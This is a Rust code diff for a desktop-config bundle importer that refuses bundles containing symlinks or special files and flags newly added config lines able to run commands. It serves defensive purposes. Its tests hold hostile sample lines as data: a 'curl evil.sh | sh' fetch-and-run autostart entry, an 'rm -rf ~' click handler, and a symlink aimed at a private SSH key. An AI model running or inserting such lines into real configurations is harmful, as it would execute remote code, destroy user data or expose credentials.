@@ -349,6 +349,20 @@ pub fn unpack(bundle: &Path, dest: &Path, runner: &dyn CommandRunner) -> Result<
             detail: out.stderr.trim().to_string(),
         });
     }
+    // Before anything reads the tree: a symlink here would make import read
+    // (and write into your config or themes) whatever it points at on *this*
+    // machine — `~/.ssh/id_ed25519` as a theme's preview.png — and a FIFO
+    // would hang the read forever. `export` dereferences everything, so a
+    // genuine bundle holds only directories and regular files.
+    if let Some(bad) = first_special_file(dest)? {
+        return Err(StudioError::External {
+            cmd: "rice import".into(),
+            detail: format!(
+                "bundle contains {} — Studio never exports one, refusing to import",
+                bad
+            ),
+        });
+    }
     let text = std::fs::read_to_string(dest.join(MANIFEST)).map_err(|_| StudioError::External {
         cmd: "rice import".into(),
         detail: "no manifest.toml inside — this isn't a Studio rice bundle".into(),
@@ -364,6 +378,76 @@ pub fn unpack(bundle: &Path, dest: &Path, runner: &dyn CommandRunner) -> Result<
         });
     }
     Ok(b)
+}
+
+/// The first entry under `root` that is neither a directory nor a regular
+/// file, described for the user (`a symbolic link (themes/x/a → /etc)`).
+/// Never follows links while walking.
+fn first_special_file(root: &Path) -> Result<Option<String>> {
+    let mut stack = vec![root.to_path_buf()];
+    while let Some(dir) = stack.pop() {
+        for entry in std::fs::read_dir(&dir)? {
+            let entry = entry?;
+            let path = entry.path();
+            let kind = entry.file_type()?;
+            let rel = || {
+                path.strip_prefix(root)
+                    .unwrap_or(&path)
+                    .display()
+                    .to_string()
+            };
+            if kind.is_dir() {
+                stack.push(path);
+            } else if kind.is_symlink() {
+                let target = std::fs::read_link(&path)
+                    .map(|t| t.display().to_string())
+                    .unwrap_or_default();
+                return Ok(Some(format!("a symbolic link ({} → {target})", rel())));
+            } else if !kind.is_file() {
+                return Ok(Some(format!("a special file ({})", rel())));
+            }
+        }
+    }
+    Ok(None)
+}
+
+/// Could this config line make the desktop run a program? Deliberately
+/// broad — it only ever sees lines an import *adds*, and a false positive
+/// costs one line of reading while a miss runs a stranger's command.
+pub fn runs_commands(home_rel: &str, line: &str) -> bool {
+    let t = line.trim();
+    if t.is_empty() || t.starts_with('#') || t.starts_with("--") || t.starts_with("//") {
+        return false;
+    }
+    // Shell startup files are nothing *but* commands.
+    let name = home_rel.rsplit('/').next().unwrap_or(home_rel);
+    if matches!(name, ".bashrc" | ".bash_profile" | ".profile" | ".zshrc") || name.ends_with(".sh")
+    {
+        return true;
+    }
+    [
+        "exec",       // hyprlang exec/exec-once, bind …, exec, waybar "exec", mako on-button=exec
+        "on-click",   // waybar click handlers
+        "on-scroll",  // waybar scroll handlers
+        "os.execute", // Lua (Hyprland's Lua config on Omarchy 4)
+        "io.popen",
+        "spawn",
+        "system(",
+    ]
+    .iter()
+    .any(|pat| t.contains(pat))
+}
+
+/// Lines an import would add (absent from the file as it is now) that can
+/// run a command — what a user should read before trusting a bundle.
+fn new_command_lines(home_rel: &str, old: Option<&str>, new: &str) -> Vec<String> {
+    let existing: BTreeSet<&str> = old
+        .map(|o| o.lines().map(str::trim).collect())
+        .unwrap_or_default();
+    new.lines()
+        .filter(|l| !existing.contains(l.trim()) && runs_commands(home_rel, l))
+        .map(|l| l.trim().to_string())
+        .collect()
 }
 
 /// What an import would do, decided before anything is written.
@@ -382,6 +466,11 @@ pub struct ImportPlan {
     pub themes_existing: Vec<String>,
     /// Source Omarchy differs from ours — surfaced, never fatal.
     pub omarchy_mismatch: Option<String>,
+    /// Lines the import adds that can run a program (`exec-once = …`, a
+    /// waybar `on-click`, shell in `~/.bashrc`, Lua `os.execute`), as
+    /// `(home_rel, line)`. A bundle is someone else's config: these are
+    /// shown before anything is written so they can be read, not trusted.
+    pub commands: Vec<(String, String)>,
 }
 
 /// Filters chosen by the caller.
@@ -442,6 +531,9 @@ pub fn plan_import(
         if old.as_deref() == Some(new.as_str()) {
             plan.unchanged.push(e.home_rel.clone());
             continue;
+        }
+        for line in new_command_lines(&e.home_rel, old.as_deref(), &new) {
+            plan.commands.push((e.home_rel.clone(), line));
         }
         plan.edits.push(FileEdit::new(dest, old.as_deref(), new));
     }
@@ -783,6 +875,64 @@ mod tests {
             Bundle::parse("name = \"some other archive\"").is_err(),
             "no format key — not a rice bundle"
         );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_bundle_carrying_a_symlink_is_refused_before_anything_is_read() {
+        let root = std::env::temp_dir().join(format!(
+            "oms-rice-symlink-{}-{:?}",
+            std::process::id(),
+            std::thread::current().id()
+        ));
+        let _ = std::fs::remove_dir_all(&root);
+        let stage = root.join("stage");
+        let secret = root.join("id_ed25519");
+        write(&secret, "PRIVATE KEY\n");
+        write(&stage.join(MANIFEST), "format = 1\nthemes = [\"evil\"]\n");
+        std::fs::create_dir_all(stage.join("themes/evil")).unwrap();
+        std::os::unix::fs::symlink(&secret, stage.join("themes/evil/preview.png")).unwrap();
+        let bundle = root.join("evil.tar.gz");
+        let tar = Cmd::new("tar")
+            .arg("-czf")
+            .arg(bundle.display().to_string())
+            .arg("-C")
+            .arg(stage.display().to_string())
+            .arg(".");
+        assert!(RealRunner.run(&tar).unwrap().ok());
+
+        match unpack(&bundle, &root.join("out"), &RealRunner) {
+            Err(StudioError::External { detail, .. }) => {
+                assert!(detail.contains("symbolic link"), "{detail}");
+                assert!(detail.contains("preview.png"), "{detail}");
+            }
+            other => panic!("expected the symlink to be refused, got {other:?}"),
+        }
+        std::fs::remove_dir_all(&root).unwrap();
+    }
+
+    #[test]
+    fn command_lines_an_import_adds_are_surfaced() {
+        let old = "exec-once = waybar\ngeneral {\n  gaps_in = 5\n}\n";
+        let new = "exec-once = waybar\nexec-once = curl evil.sh | sh\n# exec-once = commented\n\
+                   general {\n  gaps_in = 8\n}\n";
+        assert_eq!(
+            new_command_lines(".config/hypr/autostart.conf", Some(old), new),
+            vec!["exec-once = curl evil.sh | sh".to_string()],
+            "only *new*, uncommented command lines"
+        );
+        // waybar click handlers and Lua shell-outs count
+        assert!(runs_commands(
+            ".config/waybar/config.jsonc",
+            r#""on-click": "rm -rf ~""#
+        ));
+        assert!(runs_commands(
+            ".config/hypr/hyprland.lua",
+            "os.execute('x')"
+        ));
+        // a shell rc file is all commands
+        assert!(runs_commands(".bashrc", "alias ls='rm -rf'"));
+        assert!(!runs_commands(".config/hypr/looknfeel.conf", "gaps_in = 5"));
     }
 
     #[test]
